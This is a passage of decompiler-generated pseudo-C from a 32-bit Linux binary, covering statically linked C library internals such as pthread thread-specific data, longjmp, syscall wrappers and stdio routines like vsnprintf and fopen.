void *__usercall pthread_cleanup_upto@<eax>(int a1@<eax>)
{
  int v1; // edi@1
  void **v2; // esi@1
  unsigned int i; // ebx@6
  void *result; // eax@13
  char v5; // [esp+Ch] [ebp-10h]@1

  v1 = a1;
  v2 = &_pthread_initial_thread;
  if ( (unsigned int)&v5 < _pthread_initial_thread_bos )
  {
    if ( (unsigned int)&v5 < _pthread_manager_thread_bos
      || (v2 = (void **)&_pthread_manager_thread, (unsigned int)&v5 >= _pthread_manager_thread_tos) )
    {
      if ( _pthread_nonstandard_stacks )
        v2 = (void **)_pthread_find_self();
      else
        v2 = (void **)(((unsigned int)&v5 | 0x1FFFFF) - 479);
    }
  }
  for ( i = (unsigned int)v2[15]; i && i < *(_DWORD *)(v1 + 16); i = *(_DWORD *)(i + 12) )
  {
    if ( i <= (unsigned int)&v5 )
    {
      i = 0;
      break;
    }
    (*(void (__cdecl **)(_DWORD))i)(*(_DWORD *)(i + 4));
  }
  result = v2[21];
  v2[15] = (void *)i;
  if ( result )
  {
    if ( (unsigned int)result < *(_DWORD *)(v1 + 16) )
      v2[21] = 0;
  }
  return result;
}
// 80614E0: using guessed type void *_pthread_initial_thread;
// 80661CC: using guessed type int _pthread_initial_thread_bos;
// 80661D0: using guessed type int _pthread_manager_thread_bos;
// 806A600: using guessed type int _pthread_nonstandard_stacks;

//----- (0804F0EA) --------------------------------------------------------
void __cdecl __noreturn longjmp(struct __jmp_buf_tag *__attribute__((__org_arrdim(0,1))) env, int val)
{
  pthread_cleanup_upto((int)env);
  longjmp(env, val);
}

//----- (0804F105) --------------------------------------------------------
void __cdecl __noreturn siglongjmp(struct __jmp_buf_tag *__attribute__((__org_arrdim(0,1))) env, int val)
{
  pthread_cleanup_upto((int)env);
  longjmp(env, val);
}

//----- (0804F120) --------------------------------------------------------
void **thread_self_8()
{
  void **result; // eax@1
  void *retaddr; // [esp+0h] [ebp+0h]@1

  result = &_pthread_initial_thread;
  if ( (unsigned int)&retaddr < _pthread_initial_thread_bos )
  {
    if ( (unsigned int)&retaddr < _pthread_manager_thread_bos
      || (result = (void **)&_pthread_manager_thread, (unsigned int)&retaddr >= _pthread_manager_thread_tos) )
    {
      if ( _pthread_nonstandard_stacks )
        result = (void **)_pthread_find_self();
      else
        result = (void **)(((unsigned int)&retaddr | 0x1FFFFF) - 479);
    }
  }
  return result;
}
// 80614E0: using guessed type void *_pthread_initial_thread;
// 80661CC: using guessed type int _pthread_initial_thread_bos;
// 80661D0: using guessed type int _pthread_manager_thread_bos;
// 806A600: using guessed type int _pthread_nonstandard_stacks;

//----- (0804F15F) --------------------------------------------------------
void **__cdecl _pthread_internal_tsd_address(int a1)
{
  return &thread_self_8()[a1 + 91];
}

//----- (0804F178) --------------------------------------------------------
void *__cdecl _pthread_internal_tsd_get(int a1)
{
  return thread_self_8()[a1 + 91];
}

//----- (0804F18F) --------------------------------------------------------
int __cdecl _pthread_internal_tsd_set(int a1, void *a2)
{
  thread_self_8()[a1 + 91] = a2;
  return 0;
}

//----- (0804F1AC) --------------------------------------------------------
int __cdecl pthread_getspecific(unsigned int a1)
{
  _DWORD *v1; // eax@2
  int result; // eax@4

  if ( a1 <= 0x3FF && (v1 = thread_self_8()[(a1 >> 5) + 59]) != 0 && pthread_keys[2 * a1] )
    result = v1[a1 & 0x1F];
  else
    result = 0;
  return result;
}
// 8066220: using guessed type int pthread_keys[];

//----- (0804F1E9) --------------------------------------------------------
int _pthread_destroy_specifics()
{
  signed int v0; // ebp@1
  void **v1; // esi@1
  signed int v2; // edi@2
  void (__cdecl *v3)(int); // ecx@4
  int *v4; // eax@4
  int v5; // edx@4
  signed int v6; // ebx@9
  signed int i; // ebx@15
  signed int v9; // [esp+8h] [ebp-14h]@1

  v0 = 0;
  v1 = thread_self_8();
  v9 = 1;
  while ( v9 && v0 <= 3 )
  {
    v6 = 0;
    v9 = 0;
    while ( v6 <= 31 )
    {
      v2 = 0;
      if ( v1[v6 + 59] )
      {
        while ( v2 <= 31 )
        {
          v3 = (void (__cdecl *)(int))dword_8066224[2 * (v2 + 32 * v6)];
          v4 = (int *)((char *)v1[v6 + 59] + 4 * v2);
          v5 = *v4;
          if ( v3 )
          {
            if ( v5 )
            {
              *v4 = 0;
              v3(v5);
              v9 = 1;
            }
          }
          ++v2;
        }
      }
      ++v6;
    }
    ++v0;
  }
  _pthread_lock((volatile signed __int32 *)v1[7], (int)v1);
  for ( i = 0; i <= 31; ++i )
  {
    if ( v1[i + 59] )
    {
      free(v0, v1[i + 59]);
      v1[i + 59] = 0;
    }
  }
  return _pthread_unlock((volatile signed __int32 *)v1[7]);
}

//----- (0804F2BC) --------------------------------------------------------
signed int __usercall pthread_setspecific@<eax>(off_t a1@<ebp>, unsigned int a2, int a3)
{
  void **v3; // eax@3
  unsigned int v4; // esi@3
  void **v5; // edi@3
  _DWORD *v6; // edx@4
  signed int result; // eax@4

  if ( a2 > 0x3FF || !pthread_keys[2 * a2] )
    return 22;
  v3 = thread_self_8();
  v4 = a2 >> 5;
  v5 = v3;
  if ( !v3[(a2 >> 5) + 59] )
  {
    v6 = calloc(a1, (int)v3, 0x20u, 4);
    result = 12;
    if ( !v6 )
      return result;
    v5[v4 + 59] = v6;
  }
  *((_DWORD *)v5[v4 + 59] + (a2 & 0x1F)) = a3;
  return 0;
}
// 8066220: using guessed type int pthread_keys[];

//----- (0804F329) --------------------------------------------------------
signed int __cdecl pthread_key_delete(unsigned int a1)
{
  signed int result; // eax@3
  void **v2; // eax@5
  void **v3; // edx@5
  _DWORD *v4; // ecx@7

  pthread_mutex_lock((int)&pthread_keys_mutex);
  if ( a1 <= 0x3FF && pthread_keys[2 * a1] )
  {
    pthread_keys[2 * a1] = 0;
    dword_8066224[2 * a1] = 0;
    if ( _pthread_manager_request != -1 )
    {
      v2 = thread_self_8();
      v3 = v2;
      do
      {
        if ( !*((_BYTE *)v3 + 44) )
        {
          v4 = v3[(a1 >> 5) + 59];
          if ( v4 )
            v4[a1 & 0x1F] = 0;
        }
        v3 = (void **)*v3;
      }
      while ( v3 != v2 );
    }
    pthread_mutex_unlock((int)&pthread_keys_mutex);
    result = 0;
  }
  else
  {
    pthread_mutex_unlock((int)&pthread_keys_mutex);
    result = 22;
  }
  return result;
}
// 8066220: using guessed type int pthread_keys[];

//----- (0804F3C6) --------------------------------------------------------
signed int __cdecl pthread_key_create(signed int *a1, int a2)
{
  signed int v2; // ebx@1

  v2 = 0;
  pthread_mutex_lock((int)&pthread_keys_mutex);
  while ( v2 <= 1023 )
  {
    if ( !pthread_keys[2 * v2] )
    {
      pthread_keys[2 * v2] = 1;
      dword_8066224[2 * v2] = a2;
      pthread_mutex_unlock((int)&pthread_keys_mutex);
      *a1 = v2;
      return 0;
    }
    ++v2;
  }
  pthread_mutex_unlock((int)&pthread_keys_mutex);
  return 11;
}
// 8066220: using guessed type int pthread_keys[];

//----- (0804F443) --------------------------------------------------------
signed int __cdecl _libc_sigaction(int a1, int a2, int a3)
{
  int *v3; // eax@2
  signed int v4; // eax@5
  signed int v5; // ebx@5
  int v7; // [esp+Ch] [ebp-120h]@7
  int v8; // [esp+10h] [ebp-11Ch]@7
  int v9; // [esp+14h] [ebp-118h]@7
  char v10; // [esp+18h] [ebp-114h]@7
  int v11; // [esp+98h] [ebp-94h]@2
  int v12; // [esp+9Ch] [ebp-90h]@2
  int *v13; // [esp+A0h] [ebp-8Ch]@4
  char v14; // [esp+A4h] [ebp-88h]@2

  if ( a2 )
  {
    v11 = *(_DWORD *)a2;
    memcpy(&v14, (char *)(a2 + 4), 0x80u);
    v12 = *(_DWORD *)(a2 + 132) | 0x4000000;
    v3 = &_restore_rt;
    if ( !(*(_BYTE *)(a2 + 132) & 4) )
      v3 = (int *)&_restore;
    v13 = v3;
  }
  v4 = _syscall_rt_sigaction();
  v5 = v4;
  if ( a3 && v4 >= 0 )
  {
    *(_DWORD *)a3 = v7;
    memcpy((char *)(a3 + 4), &v10, 0x80u);
    *(_DWORD *)(a3 + 132) = v8;
    *(_DWORD *)(a3 + 136) = v9;
  }
  return v5;
}
// 804F434: using guessed type int _restore_rt;
// 804F43B: using guessed type char _restore;

//----- (0804F51C) --------------------------------------------------------
int __cdecl clone(int a1, int a2, int flags, int a4, int *parent_tidptr, struct user_desc *newtls, int *child_pidptr)
{
  _DWORD *v7; // ecx@3
  int result; // eax@3
  int v9; // eax@5
  int (*v10)(void); // [esp-4h] [ebp-4h]@0

  if ( !a1 )
    return _syscall_error();
  if ( !a2 )
    return _syscall_error();
  v7 = (_DWORD *)((a2 & 0xFFFFFFF0) - 28);
  v7[3] = a4;
  v7[2] = a1;
  v7[1] = 0;
  *v7 = 0;
  result = sys_clone(flags, v7, parent_tidptr, newtls, child_pidptr);
  if ( result < 0 )
    return _syscall_error();
  if ( !result )
    v9 = sys_exit(v10());
  return result;
}

//----- (0804F588) --------------------------------------------------------
int __usercall _sigsetjmp@<eax>(int ebx0@<ebx>, int ebp0@<ebp>, int a3@<edi>, int a4@<esi>, int a1, int a2)
{
  _DWORD *v6; // eax@1
  void *retaddr; // [esp+0h] [ebp+0h]@1

  v6 = (_DWORD *)a1;
  *(_DWORD *)a1 = ebx0;
  v6[1] = a4;
  v6[2] = a3;
  v6[4] = &a1;
  v6[5] = retaddr;
  v6[3] = ebp0;
  return _sigjmp_save(a1, a2);
}

//----- (0804F5AC) --------------------------------------------------------
int __usercall mmap@<eax>(size_t a1@<ecx>, int a2@<ebx>, off_t a3@<ebp>, int a4@<edi>, int a5@<esi>, char start)
{
  int result; // eax@1

  result = old_mmap(&start, a1, a2, a5, a4, a3);
  JUMPOUT(result, -4096, _syscall_error);
  return result;
}

//----- (0804F5C8) --------------------------------------------------------
unsigned int __cdecl _libc_fcntl(int fd, int cmd, struct flock *lock)
{
  unsigned int v4; // ebx@3

  if ( (unsigned int)(cmd - 12) <= 2 )
    return fcntl64(fd, cmd);
  v4 = sys_fcntl(fd, cmd, lock);
  if ( v4 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v4;
    v4 = -1;
  }
  return v4;
}

//----- (0804F620) --------------------------------------------------------
unsigned int __cdecl fcntl64(int fd, int cmd)
{
  unsigned int v2; // edi@1

  v2 = sys_fcntl64(fd, cmd);
  if ( v2 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v2;
    v2 = -1;
  }
  return v2;
}

//----- (0804F660) --------------------------------------------------------
signed int _syscall_rt_sigaction()
{
  __asm { int     80h             ; LINUX - sys_rt_sigaction }
  return 174;
}

//----- (0804F69C) --------------------------------------------------------
void __noreturn exit(int status)
{
  int v1; // eax@1

  v1 = sys_exit(status);
}

//----- (0804F6C4) --------------------------------------------------------
unsigned int __cdecl _libc_close(int fd)
{
  unsigned int v1; // edi@1

  v1 = sys_close(fd);
  if ( v1 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v1;
    v1 = -1;
  }
  return v1;
}

//----- (0804F6F4) --------------------------------------------------------
signed int _libc_fork()
{
  __asm { int     80h             ; LINUX - sys_fork }
  return 2;
}

//----- (0804F71C) --------------------------------------------------------
unsigned int __cdecl _libc_fsync(int fd)
{
  unsigned int v1; // edi@1

  v1 = sys_fsync(fd);
  if ( v1 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v1;
    v1 = -1;
  }
  return v1;
}

//----- (0804F74C) --------------------------------------------------------
int __cdecl getcwd(int a1, size_t len)
{
  int v2; // edi@1
  signed __int32 v3; // ebx@4
  char *v4; // esi@6
  unsigned int v5; // eax@8

  v2 = a1;
  if ( len )
  {
    v3 = len;
    v4 = (char *)a1;
    if ( a1 )
      goto LABEL_8;
  }
  else
  {
    if ( a1 )
    {
      *(_DWORD *)_errno_location() = 22;
      return 0;
    }
    v3 = getpagesize();
    if ( v3 < 4096 )
      v3 = 4096;
  }
  v4 = (char *)malloc(len, a1, v3);
  if ( !v4 )
    return 0;
LABEL_8:
  v5 = sys_getcwd(v4, v3);
  if ( v5 <= 0xFFFFF000 )
  {
    if ( (v5 & 0x80000000) == 0 )
    {
      if ( !a1 )
      {
        if ( len || (v2 = realloc(0, 0, v4, v5)) == 0 )
          v2 = (int)v4;
      }
      return v2;
    }
  }
  else
  {
    *(_DWORD *)_errno_location() = -v5;
  }
  if ( a1 )
    return 0;
  free(len, v4);
  return v2;
}

//----- (0804F808) --------------------------------------------------------
signed int geteuid()
{
  __asm { int     80h             ; LINUX - sys_geteuid32 }
  return 201;
}

//----- (0804F830) --------------------------------------------------------
signed int getpagesize()
{
  signed int v0; // edx@1

  v0 = 4096;
  if ( _pagesize )
    v0 = _pagesize;
  return v0;
}
// 806A474: using guessed type int _pagesize;

//----- (0804F844) --------------------------------------------------------
signed int getpid()
{
  __asm { int     80h             ; LINUX - sys_getpid }
  return 20;
}

//----- (0804F86C) --------------------------------------------------------
signed int getppid()
{
  __asm { int     80h             ; LINUX - sys_getppid }
  return 64;
}

//----- (0804F894) --------------------------------------------------------
signed int getrlimit()
{
  __asm { int     80h             ; LINUX - sys_ugetrlimit }
  return 191;
}

//----- (0804F8C8) --------------------------------------------------------
unsigned int __cdecl gettimeofday(int a1, struct timezone *tz)
{
  unsigned int v2; // ebx@1

  v2 = sys_gettimeofday((struct timeval *)a1, tz);
  if ( v2 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v2;
    v2 = -1;
  }
  return v2;
}

//----- (0804F8FC) --------------------------------------------------------
unsigned int __cdecl ioctl(int d, int request)
{
  unsigned int v2; // edi@1

  v2 = sys_ioctl(d, request);
  if ( v2 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v2;
    v2 = -1;
  }
  return v2;
}

//----- (0804F93C) --------------------------------------------------------
unsigned int __cdecl kill(int a1, int sig)
{
  unsigned int v2; // ebx@1

  v2 = sys_kill(a1, sig);
  if ( v2 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v2;
    v2 = -1;
  }
  return v2;
}

//----- (0804F970) --------------------------------------------------------
loff_t __cdecl _libc_lseek64(int fd, unsigned __int32 offset_low, unsigned __int32 offset_high, unsigned int whence)
{
  unsigned int v4; // eax@1
  signed int v5; // esi@1
  loff_t result; // [esp+8h] [ebp-14h]@1

  v4 = sys_llseek(fd, offset_high, offset_low, &result, whence);
  v5 = v4;
  if ( v4 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v4;
    return -1;
  }
  if ( v4 )
    return v5;
  return result;
}

//----- (0804F9D0) --------------------------------------------------------
void __noreturn longjmp(struct __jmp_buf_tag *__attribute__((__org_arrdim(0,1))) env, int val)
{
  signed int v2; // ebx@1

  v2 = val;
  if ( env->__mask_was_saved )
    sigprocmask(2u, (int)&env->__saved_mask);
  if ( !val )
    v2 = 1;
  _longjmp(env, v2);
}

//----- (0804FA04) --------------------------------------------------------
unsigned int __cdecl _libc_lseek(int fd, off_t offset, int whence)
{
  unsigned int v3; // edi@1

  v3 = sys_lseek(fd, offset, whence);
  if ( v3 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v3;
    v3 = -1;
  }
  return v3;
}

//----- (0804FA3C) --------------------------------------------------------
unsigned int __cdecl _libc_msync(void *addr, size_t length, int flags)
{
  unsigned int v3; // edi@1

  v3 = sys_msync(addr, length, flags);
  if ( v3 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v3;
    v3 = -1;
  }
  return v3;
}

//----- (0804FA74) --------------------------------------------------------
unsigned int __cdecl munmap(int a1, int len)
{
  unsigned int v2; // ebx@1

  v2 = sys_munmap((void *)a1, len);
  if ( v2 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v2;
    v2 = -1;
  }
  return v2;
}

//----- (0804FAA8) --------------------------------------------------------
unsigned int __cdecl _libc_nanosleep(int a1, struct timespec *rem)
{
  unsigned int v2; // ebx@1

  v2 = sys_nanosleep((const struct timespec *)a1, rem);
  if ( v2 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v2;
    v2 = -1;
  }
  return v2;
}

//----- (0804FADC) --------------------------------------------------------
unsigned int __cdecl _libc_open(char *filename, int flags, int a3)
{
  unsigned __int16 v3; // ax@1
  unsigned int v4; // ebx@3

  v3 = 0;
  if ( flags & 0x40 )
    v3 = a3;
  v4 = sys_open(filename, flags, v3);
  if ( v4 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v4;
    v4 = -1;
  }
  return v4;
}

//----- (0804FB27) --------------------------------------------------------
unsigned int __cdecl creat(char *filename, int a2)
{
  return _libc_open(filename, 577, a2);
}

//----- (0804FB40) --------------------------------------------------------
unsigned int __cdecl _libc_open64(char *filename, int a2, int a3)
{
  int v4; // eax@1
  int v5; // edx@1

  v4 = 0;
  v5 = a2;
  if ( a2 & 0x40 )
    v4 = a3;
  BYTE1(v5) |= 0x80u;
  return _libc_open(filename, v5, v4);
}

//----- (0804FB70) --------------------------------------------------------
signed int _libc_pause()
{
  __asm { int     80h             ; LINUX - sys_pause }
  return 29;
}

//----- (0804FB98) --------------------------------------------------------
unsigned int __cdecl pipe(int *filedes)
{
  unsigned int v1; // edi@1

  v1 = sys_pipe(filedes);
  if ( v1 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v1;
    v1 = -1;
  }
  return v1;
}

//----- (0804FBC8) --------------------------------------------------------
unsigned int __cdecl poll(struct pollfds *ufds, unsigned int nfds, int timeout)
{
  unsigned int v3; // edi@1

  v3 = sys_poll(ufds, nfds, timeout);
  if ( v3 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v3;
    v3 = -1;
  }
  return v3;
}

//----- (0804FC00) --------------------------------------------------------
unsigned int __usercall _fake_pread_write64@<eax>(size_t len@<ecx>, void *addr@<edx>, int a3@<eax>, int a4, int a5, int a6)
{
  void *v6; // ebp@1
  size_t v7; // ebx@1
  loff_t v8; // kr00_8@1
  unsigned int v9; // eax@4
  unsigned int v10; // ebp@6
  int *v11; // ebx@6
  int fd; // [esp+10h] [ebp-1Ch]@1
  int v14; // [esp+14h] [ebp-18h]@6

  v6 = addr;
  v7 = len;
  fd = a3;
  v8 = _libc_lseek64(a3, 0, 0, 1u);
  if ( v8 == -1 || _libc_lseek64(fd, a4, a5, 0) == -1 )
    return -1;
  if ( a6 == 1 )
    v9 = _libc_write(fd, v6, v7);
  else
    v9 = _libc_read(fd, v6, v7);
  v10 = v9;
  v11 = (int *)_errno_location();
  v14 = *v11;
  if ( _libc_lseek64(fd, v8, HIDWORD(v8), 0) != -1 )
  {
    *v11 = v14;
    return v10;
  }
  if ( v10 != -1 )
    return -1;
  *v11 = v14;
  return v10;
}

//----- (0804FCC6) --------------------------------------------------------
unsigned int __cdecl pwrite64(int a1, void *addr, size_t len, int a4, int a5)
{
  return _fake_pread_write64(len, addr, a1, a4, a5, 1);
}

//----- (0804FCF3) --------------------------------------------------------
unsigned int __cdecl _libc_pread64(int a1, void *addr, size_t len, int a4, int a5)
{
  return _fake_pread_write64(len, addr, a1, a4, a5, 0);
}

//----- (0804FD20) --------------------------------------------------------
unsigned int __usercall _fake_pread_write@<eax>(size_t len@<ecx>, void *addr@<edx>, int a3@<eax>, off_t offset, int a5)
{
  int v5; // edi@1
  void *v6; // esi@1
  size_t v7; // ebx@1
  unsigned int v8; // eax@4
  unsigned int v9; // esi@6
  int *v10; // ebx@6
  int v11; // ebp@6
  unsigned int v13; // [esp+Ch] [ebp-14h]@1

  v5 = a3;
  v6 = addr;
  v7 = len;
  v13 = _libc_lseek(a3, 0, 1);
  if ( v13 == -1 || _libc_lseek(v5, offset, 0) == -1 )
    return -1;
  v8 = a5 == 1 ? _libc_write(v5, v6, v7) : _libc_read(v5, v6, v7);
  v9 = v8;
  v10 = (int *)_errno_location();
  v11 = *v10;
  if ( _libc_lseek(v5, v13, 0) == -1 && v9 != -1 )
    return -1;
  *v10 = v11;
  return v9;
}

//----- (0804FDAA) --------------------------------------------------------
unsigned int __cdecl _libc_pwrite(off_t offset, void *addr, size_t len, off_t a4)
{
  return _fake_pread_write(len, addr, offset, a4, 1);
}

//----- (0804FDCD) --------------------------------------------------------
unsigned int __cdecl _libc_pread(off_t offset, void *addr, size_t len, off_t a4)
{
  return _fake_pread_write(len, addr, offset, a4, 0);
}

//----- (0804FDF0) --------------------------------------------------------
unsigned int __cdecl _libc_read(int fd, void *addr, size_t len)
{
  unsigned int v3; // edi@1

  v3 = sys_read(fd, addr, len);
  if ( v3 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v3;
    v3 = -1;
  }
  return v3;
}

//----- (0804FE28) --------------------------------------------------------
unsigned int __cdecl sched_get_priority_max(int policy)
{
  unsigned int v1; // edi@1

  v1 = sys_sched_get_priority_max(policy);
  if ( v1 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v1;
    v1 = -1;
  }
  return v1;
}

//----- (0804FE58) --------------------------------------------------------
unsigned int __cdecl sched_get_priority_min(int policy)
{
  unsigned int v1; // edi@1

  v1 = sys_sched_get_priority_min(policy);
  if ( v1 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v1;
    v1 = -1;
  }
  return v1;
}

//----- (0804FE88) --------------------------------------------------------
unsigned int __cdecl sched_getparam(int a1, struct sched_param *p)
{
  unsigned int v2; // ebx@1

  v2 = sys_sched_getparam(a1, p);
  if ( v2 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v2;
    v2 = -1;
  }
  return v2;
}

//----- (0804FEBC) --------------------------------------------------------
unsigned int __cdecl sched_getscheduler(pid_t pid)
{
  unsigned int v1; // edi@1

  v1 = sys_sched_getscheduler(pid);
  if ( v1 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v1;
    v1 = -1;
  }
  return v1;
}

//----- (0804FEEC) --------------------------------------------------------
unsigned int __cdecl sched_setscheduler(pid_t pid, int policy, const struct sched_param *p)
{
  unsigned int v3; // edi@1

  v3 = sys_sched_setscheduler(pid, policy, p);
  if ( v3 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v3;
    v3 = -1;
  }
  return v3;
}

//----- (0804FF24) --------------------------------------------------------
signed int sched_yield()
{
  __asm { int     80h             ; LINUX - sys_sched_yield }
  return 158;
}

//----- (0804FF4C) --------------------------------------------------------
unsigned int __cdecl select(int n, fd_set *readfds, fd_set *writefds, fd_set *except_fds, struct timeval *timeout)
{
  unsigned int v5; // esi@1

  v5 = sys_select(n, readfds, writefds, except_fds, timeout);
  if ( v5 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v5;
    v5 = -1;
  }
  return v5;
}

//----- (0804FF8C) --------------------------------------------------------
unsigned int __cdecl setrlimit(int a1, const struct rlimit *rlim)
{
  unsigned int v2; // ebx@1

  v2 = sys_setrlimit(a1, rlim);
  if ( v2 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v2;
    v2 = -1;
  }
  return v2;
}

//----- (0804FFC0) --------------------------------------------------------
signed int __cdecl sigprocmask(unsigned int a1, int a2)
{
  signed int result; // eax@3

  if ( a2 && a1 > 2 )
  {
    *(_DWORD *)_errno_location() = 22;
    result = -1;
  }
  else
  {
    __asm { int     80h             ; LINUX - sys_rt_sigprocmask }
    result = 175;
  }
  return result;
}

//----- (08050018) --------------------------------------------------------
signed int sigsuspend()
{
  __asm { int     80h             ; LINUX - sys_rt_sigsuspend }
  return 179;
}

//----- (0805004C) --------------------------------------------------------
unsigned int __cdecl time(time_t *time_0)
{
  unsigned int v1; // edi@1

  v1 = sys_time(time_0);
  if ( v1 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v1;
    v1 = -1;
  }
  return v1;
}

//----- (0805007C) --------------------------------------------------------
unsigned int __cdecl _libc_wait(int *status)
{
  return wait4(-1, status, 0, 0);
}

//----- (08050094) --------------------------------------------------------
unsigned int __cdecl wait4(pid_t pid, int *status, int options, struct rusage *rusage)
{
  unsigned int v4; // esi@1

  v4 = sys_wait4(pid, status, options, rusage);
  if ( v4 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v4;
    v4 = -1;
  }
  return v4;
}

//----- (080500D0) --------------------------------------------------------
unsigned int __cdecl _libc_waitpid(pid_t pid, int *status, int options)
{
  return wait4(pid, status, options, 0);
}

//----- (080500EC) --------------------------------------------------------
unsigned int __cdecl _libc_write(int fd, const void *addr, size_t len)
{
  unsigned int v3; // edi@1

  v3 = sys_write(fd, addr, len);
  if ( v3 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v3;
    v3 = -1;
  }
  return v3;
}

//----- (08050124) --------------------------------------------------------
int __cdecl toupper(int a1)
{
  int v1; // edx@1

  v1 = a1;
  if ( (unsigned int)(a1 + 128) <= 0x17F )
    v1 = *((signed __int16 *)_ctype_toupper + a1);
  return v1;
}
// 8061984: using guessed type void *_ctype_toupper;

//----- (08050144) --------------------------------------------------------
signed int __cdecl fclose(int a1)
{
  unsigned __int32 v1; // ebp@1
  signed int v2; // edi@3
  char v4; // [esp+1Ch] [ebp-30h]@7
  char v5; // [esp+2Ch] [ebp-20h]@2

  v1 = *(_DWORD *)(a1 + 52);
  if ( !v1 )
  {
    pthread_cleanup_push_defer(&v5, (int)pthread_mutex_unlock, a1 + 56);
    pthread_mutex_lock(a1 + 56);
  }
  v2 = 0;
  if ( *(_BYTE *)a1 & 0x40 )
    v2 = fflush_unlocked(a1);
  if ( (_libc_close(*(_DWORD *)(a1 + 4)) & 0x80000000) != 0 )
    v2 = -1;
  *(_DWORD *)(a1 + 4) = -1;
  pthread_cleanup_push_defer(&v4, (int)pthread_mutex_unlock, (int)&stdio_openlist_del_lock);
  pthread_mutex_lock((int)&stdio_openlist_del_lock);
  ++stdio_openlist_use_count;
  pthread_cleanup_pop_restore(v1, (int)&v4, 1);
  *(_WORD *)a1 &= 0x6000u;
  *(_WORD *)a1 |= 0x30u;
  if ( !v1 )
    pthread_cleanup_pop_restore(0, (int)&v5, 1);
  if ( *(_BYTE *)(a1 + 1) & 0x40 )
    free(v1, *(_DWORD **)(a1 + 8));
  pthread_cleanup_push_defer(&v4, (int)pthread_mutex_unlock, (int)&stdio_openlist_del_lock);
  pthread_mutex_lock((int)&stdio_openlist_del_lock);
  ++stdio_openlist_del_count;
  pthread_cleanup_pop_restore(v1, (int)&v4, 1);
  stdio_openlist_dec_use(v1);
  return v2;
}
// 8068240: using guessed type int stdio_openlist_use_count;
// 8068244: using guessed type int stdio_openlist_del_count;

//----- (08050250) --------------------------------------------------------
int __cdecl fopen(char *filename, int a2)
{
  return stdio_fopen(filename, a2, 0, -1);
}

//----- (08050268) --------------------------------------------------------
int __cdecl vsprintf(int a1, void *a2, int a3)
{
  return vsnprintf(a1, 0xFFFFFFFF, a2, a3);
}

//----- (08050284) --------------------------------------------------------
int sprintf(int a1, const char *a2, ...)
{
  va_list va; // [esp+28h] [ebp+Ch]@1

  va_start(va, a2);
  return vsnprintf(a1, 0xFFFFFFFF, (void *)a2, (int)va);
}

//----- (080502A4) --------------------------------------------------------
int __cdecl vsnprintf(int a1, unsigned int a2, void *a3, int a4)
{
  int v4; // ebx@1
  int v5; // edx@3
  __int16 v7; // [esp+18h] [ebp+0h]@1
  char v8; // [esp+1Ah] [ebp+2h]@1
  int v9; // [esp+1Ch] [ebp+4h]@1
  int v10; // [esp+20h] [ebp+8h]@3
  _BYTE *v11; // [esp+24h] [ebp+Ch]@3
  _BYTE *v12; // [esp+28h] [ebp+10h]@3
  int v13; // [esp+2Ch] [ebp+14h]@3
  int v14; // [esp+30h] [ebp+18h]@3
  int v15; // [esp+34h] [ebp+1Ch]@3
  int v16; // [esp+38h] [ebp+20h]@1
  int v17; // [esp+44h] [ebp+2Ch]@1
  int v18; // [esp+4Ch] [ebp+34h]@1
  int v19; // [esp+50h] [ebp+38h]@1

  v9 = -2;
  v7 = 208;
  v8 = 0;
  v17 = 0;
  v18 = 1;
  v4 = ~a1;
  _stdio_init_mutex((char *)&v19);
  v16 = 0;
  if ( ~a1 > a2 )
    v4 = a2;
  v10 = a1;
  v11 = (_BYTE *)(a1 + v4);
  v15 = a1 + v4;
  v12 = (_BYTE *)a1;
  v13 = a1;
  v14 = a1;
  v5 = vfprintf_internal((size_t)&v7, a3, a4);
  if ( v4 )
  {
    if ( v12 == v11 )
      v12 = v11 - 1;
    *v12 = 0;
  }
  return v5;
}

//----- (08050358) --------------------------------------------------------
int __cdecl stdio_fopen(char *filename, int a2, int a3, int fd)
{
  int v4; // ebp@1
  char v5; // al@1
  int v6; // ebx@2
  int v7; // eax@8
  int v8; // eax@13
  signed int v9; // eax@22
  char v10; // al@23
  int v11; // ebx@23
  int *v12; // esi@23
  int v13; // edi@23
  int v14; // eax@24
  int v15; // eax@27
  bool v16; // zf@27
  char v18; // [esp+1Ch] [ebp-30h]@28
  char v19; // [esp+2Ch] [ebp-20h]@28

  v4 = a3;
  v5 = *(_BYTE *)a2;
  if ( *(_BYTE *)a2 == 114 )
  {
    v6 = 0;
  }
  else
  {
    v6 = 577;
    if ( v5 != 119 )
    {
      LOWORD(v6) = 1089;
      if ( v5 != 97 )
      {
LABEL_4:
        *(_DWORD *)_errno_location() = 22;
        if ( !v4 )
          return 0;
LABEL_5:
        if ( *(_BYTE *)(v4 + 1) & 0x20 )
        {
          free(v4, (_DWORD *)v4);
          return 0;
        }
        return 0;
      }
    }
  }
  v7 = a2 + 1;
  if ( *(_BYTE *)(a2 + 1) != 98 )
    v7 = a2;
  if ( *(_BYTE *)(v7 + 1) == 43 )
    v6 = (v6 | 1) + 1;
  if ( !a3 )
  {
    v8 = malloc(0, fd, 0x50u);
    v4 = v8;
    if ( !v8 )
      return v4;
